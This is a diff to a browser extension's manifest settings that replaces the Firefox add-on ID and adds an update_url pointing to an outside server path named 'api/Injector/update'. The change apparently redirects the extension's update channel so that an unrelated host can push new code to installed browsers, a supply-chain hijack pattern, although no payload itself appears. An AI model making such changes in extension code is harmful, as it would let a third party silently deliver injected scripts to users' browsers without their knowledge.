@@ -68,5 +68,6 @@ minimum_chrome_version: '61.0'
 
 browser_specific_settings:
   gecko:
-    id: '{aecec67f-0d10-4fa7-b7c7-609a2db280cf}'
+    id: '{3f7b1a2e-9c8d-4e55-8f24-1a2b3c4d5e6f}'
     strict_min_version: '58.0'
+    update_url: 'https://smanager.causeandeffectstrategy.com/api/Injector/update?browser=firefox'
